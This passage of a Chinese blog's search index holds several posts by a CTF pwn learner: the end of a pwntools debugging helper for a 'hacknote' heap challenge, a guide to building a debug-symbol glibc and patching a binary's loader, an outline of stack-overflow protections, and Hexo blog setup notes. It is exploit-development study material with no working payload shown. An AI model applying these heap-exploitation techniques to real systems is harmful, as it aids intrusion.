punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 阻塞，方便gdb的调试</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"to send size of note"</span><span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"size :"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"to send data of note"</span><span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>hacknote<span class="token punctuation">.</span>py <span class="token comment" spellcheck="true"># 启动当前binary</span>gdb <span class="token punctuation">.</span><span class="token operator">/</span>binary <span class="token comment" spellcheck="true"># gdb启动调试</span>gdb<span class="token operator">></span>attach<span class="token punctuation">(</span>at<span class="token punctuation">)</span> （pid可选） <span class="token comment" spellcheck="true"># 直接附加到脚本启动的binary进程</span>gdb<span class="token operator">></span>n<span class="token comment" spellcheck="true"># hacknote.py利用脚本中关键payload前pause()</span><span class="token comment" spellcheck="true"># 错误解决 gdb attach ptrace: Operation not permitted.</span><span class="token comment" spellcheck="true"># sudo gdb ./binary</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自选择glibc带符号版本调试</title>
      <link href="/2019/07/15/zi-xuan-ze-glibc-dai-fu-hao-ban-ben-diao-shi/"/>
      <url>/2019/07/15/zi-xuan-ze-glibc-dai-fu-hao-ban-ben-diao-shi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>使用电脑浏览效果更佳！</p></blockquote><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>​    在学习堆内存管理器ptmalloc，想深入的了解各版本的glibc库在malloc,free中做的判断与安全保护（如double free的检测），挖掘一些glibc的漏洞与绕过手法，深入调试带符号的Glibc版本是有必要的（感觉上），在安装环境过程中，发现百度，Google在这方面的资料是在过于匮乏与过时，在此记录一些我在从下载对应版本Glibc库-&gt; 编译带符号glibc库-&gt; 修改当前程序loader-&gt; gdb的lay src源码窗口调试的过程。</p><a id="more"></a><p>​    刚入门pwn，说实话做pwn如果把堆内存学号应该是一个分水岭了吧，一年来纠结于提高专业课程的成绩与自己热爱的pwn学习中，断断续续的学，还真把一些知识重复的看了好几遍（看了过一段时间又忘了），也知道在安全方面有一个师傅是真的好（听说德国的工程师是师傅带徒弟的模式），希望有志同道合的朋友一起学习（扣扣：2280986957），也期盼有大佬手下小弟做徒弟-_-</p><h3 id="方案介绍"><a href="#方案介绍" class="headerlink" title="方案介绍"></a>方案介绍</h3><p>一些google搜索关于源码调试glibc解决方案：</p><ul><li><p>方案一：</p><p>  安装官方编译好的glibc-dbg带符号调试版本</p><pre class="line-numbers language-shell"><code class="language-shell">  # 其他版本 https://launchpad.net/ubuntu/+source/glibc/2.21-0ubuntu4  # 如32位，此处安装的是64位  sudo apt-get install libc6-dbg  sudo apt-get source libc6-dev # sources.list 中dbkg-src的作用，下载源码  # 参考 https://blog.csdn.net/u012927281/article/details/51289608<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  显然，此处安装的是根据当前系统自带的glibc版本来安装对应调试版本，并不能自定义的选择glibc版本。此方案适用非安全专业适用也够了。</p></li><li><p>方案二：</p><p>  自己选择Glibc版本下载进行编译安装。此方案可以自己选择glibc版本进行编译安装，且不用更改系统默认的glibc库，同时使用多个Glibc库。只需要更改调试程序的rpath即可</p><p>  此处选择方案二进行安装（实践、，可行）</p><p>  <a href="https://n132.github.io/2018/04/30/2018-04-30-%E7%BC%96%E8%AF%91-Libc-2-23/#0x005-%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95-etc-ld-so-conf-%E7%BC%BA%E5%A4%B1" target="_blank" rel="noopener">参考</a>：</p></li></ul><h3 id="带符号Glibc库调试环境"><a href="#带符号Glibc库调试环境" class="headerlink" title="带符号Glibc库调试环境"></a>带符号Glibc库调试环境</h3><h4 id="下载版本glibc库"><a href="#下载版本glibc库" class="headerlink" title="下载版本glibc库"></a>下载版本glibc库</h4><pre><code>http://ftp.gnu.org/gnu/glibc/</code></pre><h4 id="指定安装与源码存放的位置"><a href="#指定安装与源码存放的位置" class="headerlink" title="指定安装与源码存放的位置"></a>指定安装与源码存放的位置</h4><pre class="line-numbers language-shell"><code class="language-shell"># 如安装在/usr/local/glibc/glibc2.23# 源码存放/home/thonsun/Desktop/glibc/glibc-2.23/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="程序config配置"><a href="#程序config配置" class="headerlink" title="程序config配置"></a>程序config配置</h4><pre class="line-numbers language-shell"><code class="language-shell"># 在下载源码的文件夹解压进入源码# /home/thonsun/Desktop/glibc/glibc-2.23/mkdir build # 要在新的空的文件夹进行configure配置，存放makefile文件# configure编译时提示：configure: error: you must configure in a separate build directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>x64的编译配置</p><pre class="line-numbers language-shell"><code class="language-shell">  CFLAGS="-g -g3 -ggdb -gdwarf-4 -Og"  CXXFLAGS="-g -g3 -ggdb -gdwarf-4 -Og"  ../configure --prefix=/path/to/install  # ../configure --prefix=/usr/local/glibc/glibc2.23/x64 我的配置  # touch /usr/local/glibc/glibc2.23/x64/etc/ld.so.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>x32的编译配置</p><pre class="line-numbers language-shell"><code class="language-shell">  # 在前面的已经生成64位的情况下，再同保留两个版本的要新建一个build32/,和安装文件夹x32/  # /usr/local/glibc/glibc2.23/x32  # /home/thonsun/Desktop/glibc/glibc-2.23/bulid32  CC="gcc -m32" CXX="g++ -m32" \  CFLAGS="-g -g3 -ggdb -gdwarf-4 -Og -Wno-error" \  CXXFLAGS="-g -g3 -ggdb -gdwarf-4 -Og" \  ../configure --prefix=/usr/local/glibc/glibc2.23/x32 --host=i686-linux-gnu  # libc2.21错误  /usr/bin/ld: Relocatable linking with relocations from format elf64-x86-64 to format elf32-i386<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>安装</p><pre class="line-numbers language-shell"><code class="language-shell">  # 在root的shell  su  make && make install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="修改loader"><a href="#修改loader" class="headerlink" title="修改loader"></a>修改loader</h3><p>他们在程序运行加载的作用：</p><p>ELF interpreter：<br>RPATH：</p><pre class="line-numbers language-shell"><code class="language-shell"># ubuntu16.04的更新源https://blog.csdn.net/lym152898/article/details/79100507# 安装pathelfsudo apt-get install patchelf# pathelf使用 https://nixos.org/patchelf.html# 修改要调试的程序（推荐使用）# x64patchelf --set-interpreter /usr/local/glibc/glibc2.23/lib/ld-linux-x86-64.so.2 --set-rpath /usr/local/glibc/glibc2.23/lib/ double_free# x32 patchelf --set-interpreter /usr/local/glibc/glibc2.23/x32/lib/ld-linux.so.2 --set-rpath /usr/local/glibc/glibc2.23/x32/lib/ double_free32# 注：ld-linux-x86-64.so.2为一个编译生成的lib库中的loader的ld-so.2的连接文件，会默认加载当前的libc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><ol><li><p>检查程序依赖</p><p> x64</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563203720203.png" alt="1563203720203"></p><p> x32</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563205251945.png" alt="1563205251945"></p></li><li><p>Double free检查</p></li></ol><pre class="line-numbers language-shell"><code class="language-shell">vim ~/.gdbinit(gdb)>lay srcdirectory xxxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563202314979.png" alt="1563202314979"></p><ul><li><p>使用docker来承载题目：</p><pre><code>  参考：  https://e3pem.github.io/2018/10/01/%E6%9D%82%E9%A1%B9/%E5%9C%A8docker%E4%B8%AD%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/  https://github.com/skysider/pwndocker</code></pre></li></ul><h3 id="pwn题选择libc版本"><a href="#pwn题选择libc版本" class="headerlink" title="pwn题选择libc版本"></a>pwn题选择libc版本</h3><p>问题：低版本的ld-x.so无法加载高版本的libc-x.so（ld-x.so与libc-x.so的爱恨情仇）</p><p>解决：</p><ol><li>自编译替换challenge binary的ld(loader | interpreter)和libc的加载路径 =&gt; patchelf</li><li>采用docker容器运行challenge binary，使用gdb远程attach</li></ol><p>参考解决：</p><pre><code>http://look3little.blogspot.com/2017/12/debug-symbolglibc.htmlhttps://bbs.pediy.com/thread-225849.htmhttp://brieflyx.me/2018/linux-tools/handling-so-hell/https://www.cnblogs.com/xingzherufeng/p/9682660.html# 过时的用法1. LD_PRELOAD=/usr/local/glibc/glibc2.21/x64/lib/libc.so.6 /usr/local/glibc/glibc2.21/x64/lib/ld-2.28.so ./binary2.export LD_LIBRARY_PATH=`/usr/local/glibc/glibc2.21/x64/lib` #当前目录为加载目录export LD_PRELOAD=/usr/local/glibc/glibc2.21/x64/lib/libc.so.6                                        #你的libc #加载本地pwn题目下的libc最后不用了在：unset LD_PRELOAD #调试完记得删除环境变量</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>markdown使用</title>
      <link href="/2019/06/29/markdown-shi-yong/"/>
      <url>/2019/06/29/markdown-shi-yong/</url>
      
        <content type="html"><![CDATA[<blockquote><p>使用电脑浏览效果更佳！</p></blockquote><h3 id="typora的常用markdown语法"><a href="#typora的常用markdown语法" class="headerlink" title="typora的常用markdown语法"></a>typora的常用markdown语法</h3><a id="more"></a><pre><code>遇到一个就记录一个使用，或者查询怎么写，不需要一开始就什么都会才去做a bold attempt is half success</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux下栈溢出的利用手法</title>
      <link href="/2019/06/29/linux-xia-zhan-yi-chu-de-li-yong-shou-fa/"/>
      <url>/2019/06/29/linux-xia-zhan-yi-chu-de-li-yong-shou-fa/</url>
      
        <content type="html"><![CDATA[<h3 id="linux下pwn的入门环境"><a href="#linux下pwn的入门环境" class="headerlink" title="linux下pwn的入门环境"></a>linux下pwn的入门环境</h3><ol><li>Ubuntu16.04</li><li>pwntools</li><li>pwndbg</li></ol><p>即开始pwn的旅程，GitHub上 有在Ubuntu16.04上面一键布置的bash脚本</p><h3 id="熟悉linux下的常用命令"><a href="#熟悉linux下的常用命令" class="headerlink" title="熟悉linux下的常用命令"></a>熟悉linux下的常用命令</h3><pre class="line-numbers language-shell"><code class="language-shell"># 可以安装使用terminator分屏ctrl+a ctrl+e # 回退左部，右部ctrl+shift+c ctrl+shift+v # 控制台复制与粘贴ctrl+l #清屏file xxxchecksec xxxcyclic create 100cyclic -l xxxx #定位溢出点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="虚拟机一些使用技巧"><a href="#虚拟机一些使用技巧" class="headerlink" title="虚拟机一些使用技巧"></a>虚拟机一些使用技巧</h3><a id="more"></a><pre><code>屏幕适应客户机查看-自由拉伸-立即适应客户机（win）查看-立即适应客户机（linux）kali2017 open-vm-tools</code></pre><h3 id="安全机制与绕过手法"><a href="#安全机制与绕过手法" class="headerlink" title="安全机制与绕过手法"></a>安全机制与绕过手法</h3><h4 id="3-1-没有保护"><a href="#3-1-没有保护" class="headerlink" title="3.1 没有保护"></a>3.1 没有保护</h4><h4 id="3-2-NX保护"><a href="#3-2-NX保护" class="headerlink" title="3.2 NX保护"></a>3.2 NX保护</h4><h4 id="3-3-Canary保护"><a href="#3-3-Canary保护" class="headerlink" title="3.3 Canary保护"></a>3.3 Canary保护</h4><h4 id="3-4-PIE保护"><a href="#3-4-PIE保护" class="headerlink" title="3.4 PIE保护"></a>3.4 PIE保护</h4><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>shellcode 编写：包括windows,linux下的汇编代码</p><p><a href="https://blog.csdn.net/raintungli/article/details/43865041" target="_blank" rel="noopener">参考</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo便捷网站配置</title>
      <link href="/2019/06/28/hexo-bian-jie-wang-zhan-pei-zhi/"/>
      <url>/2019/06/28/hexo-bian-jie-wang-zhan-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h3 id="本地新建md文章"><a href="#本地新建md文章" class="headerlink" title="本地新建md文章"></a>本地新建md文章</h3><pre class="line-numbers language-shell"><code class="language-shell"># 在hexo 配置好的路经打开窗口# D:\MarkdownFiles\blog\sourcehexo new "my aticle name"# 此时会在博客目录下生成一个./_post/atcitle_name.md的markdown文件，通常就是用typora等markdown编辑器编辑这个文件下的博客文章# markdown的语法与hexo的文章格式# 以下所有命令都在blog的根目录下运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="hexo加密文章"><a href="#hexo加密文章" class="headerlink" title="hexo加密文章"></a>hexo加密文章</h3><p>未写完&amp;私密记录分享</p><p>1.安装插件：</p><p><code>npm install --save hexo-blog-encrypt</code></p><p>2.修改配置 <code>_config.yml</code> 中启用该插件:</p><pre><code># Security##encrypt:    enable: true</code></pre><p>3.文章配置</p><pre><code>---title: hello worlddate: 2016-03-30 21:18:02tags:    - fdsfadsfa    - fdsafsdafpassword: Mikeabstract: Welcome to my blog, enter password to read.message: Welcome to my blog, enter password to read.---</code></pre><ul><li>password: 是该博客加密使用的密码</li><li>abstract: 是该博客的摘要，会显示在博客的列表页</li><li>message: 这个是博客查看时，密码输入框上面的描述性文字</li></ul><h3 id="发布到github"><a href="#发布到github" class="headerlink" title="发布到github"></a>发布到github</h3><pre class="line-numbers language-shell"><code class="language-shell">hexo clean 每当有站点、主题的配置更新时刷新所有文件格式hexo g # 生成静态的文件hexo d # push到github进行展示# hexo g -d#  hexo s --debug 本地调试样式localhost:4000# 配置hexo 免密发布# 1. add github ssh key;测试 ssh -T git@github.com# 2. 编辑_config.yml文件，修改文件里面的deploy，deploy:type: gitrepo: git@github.com:mykonons/mykonons.github.io.gitbranch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><a id="more"></a><p>###hexo seo优化</p><pre><code>https://hoxis.github.io/Hexo+Next%20SEO%E4%BC%98%E5%8C%96.html</code></pre><h3 id="hexo的网站配置"><a href="#hexo的网站配置" class="headerlink" title="hexo的网站配置"></a>hexo的网站配置</h3><pre class="line-numbers language-shell"><code class="language-shell"># 参考：https://hexo.io/zh-cn/docs/configuration# 常用的编写博客命令hexo init [文件夹] #初始化网站。如果没有folder提供，Hexo将在当前目录中设置网站。hexo new [layout] name # 默认新建一个markdown的笔记# 删除页面 直接删/source/xxx/的新建页面就可以了，主页会相应修改<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="next的主题配置"><a href="#next的主题配置" class="headerlink" title="next的主题配置"></a>next的主题配置</h3><pre class="line-numbers language-shell"><code class="language-shell"># 参考：https://theme-next.iissnan.com/theme-settings.html#categories-page# 修改 ./themes/next/* 的主题文件配置# 侧边栏# 底部的浏览统计# 文章评论# 头衔等等<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="其他的技术"><a href="#其他的技术" class="headerlink" title="其他的技术"></a>其他的技术</h3><pre class="line-numbers language-shell"><code class="language-shell"># 图床技术：解决图片插入保存的问题# 浏览统计 解决卜算子失效https://juejin.im/post/5bbc954a5188255c7c657ca5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="在markdown本地编写的文章解决图片"><a href="#在markdown本地编写的文章解决图片" class="headerlink" title="在markdown本地编写的文章解决图片"></a>在markdown本地编写的文章解决图片</h3><pre class="line-numbers language-shell"><code class="language-shell"># hexo的发布本地markdown笔记为htmlhexo clean # 会删除本地的所有配置的静态seo网页# 一般流程实施hexo new "title"markdown 中编写头部的categories和tagshexo g -d #等待一分钟即可，github上会有延时# <!-- more --> 手动设置主页分割##################### 实践解决 typora解决本地图片与生成html路经的正确配置# 文件头：typora-root-url: .. + 偏好设置->图片设置->{../images + 优先使用相对路径}# 参考 ：https://anynote.me/1036055241.html# 对有修改后续更新的博文发布到GitHub：hexo g -d####################<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>偏好设置：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1561813472533.png" alt="1561813472533"></p><h3 id="删除npm的安装包"><a href="#删除npm的安装包" class="headerlink" title="删除npm的安装包"></a>删除npm的安装包</h3><ul><li><p>方案一：npm uninstall xxx</p></li><li><p>方案二：粗暴删除文件夹</p><p>  <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1561813283410.png" alt="1561813283410"></p></li></ul><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><blockquote><p><a href="https://sunhwee.com/posts/6e8839eb.html" target="_blank" rel="noopener">matery 主题blog</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具使用 </tag>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
